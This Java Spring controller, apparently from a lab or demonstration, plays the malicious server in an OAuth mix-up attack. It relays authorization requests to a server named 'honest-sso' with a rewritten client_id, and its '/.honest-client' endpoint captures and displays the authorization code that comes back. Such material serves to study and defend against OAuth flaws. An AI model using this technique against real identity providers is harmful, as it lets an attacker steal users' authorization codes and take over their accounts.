package com.example.evil;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
public class HomeController {
	@GetMapping("/")
	public String index() {
		return "hello";
	}

	@GetMapping("/oauth2/authorize")
	public String authorize(
			@RequestParam("response_type") String responseType,
			@RequestParam("client_id") String clientId,
			@RequestParam("scope") String scope,
			@RequestParam("state") String state,
			@RequestParam("redirect_uri") String redirectUri) {
		return String.format(
				"redirect:http://honest-sso:9000/oauth2/authorize?response_type=%s&client_id=%s&scope=%s&state=%s&redirect_uri=%s",
				responseType,
				clientId.replace("evil", "honest"),
				scope,
				state,
				redirectUri
		);
	}

	@GetMapping("/.honest-client")
	public String authorize(Model model,  @RequestParam String code) {
		model.addAttribute("code", code);
		return "authorized";
	}
}
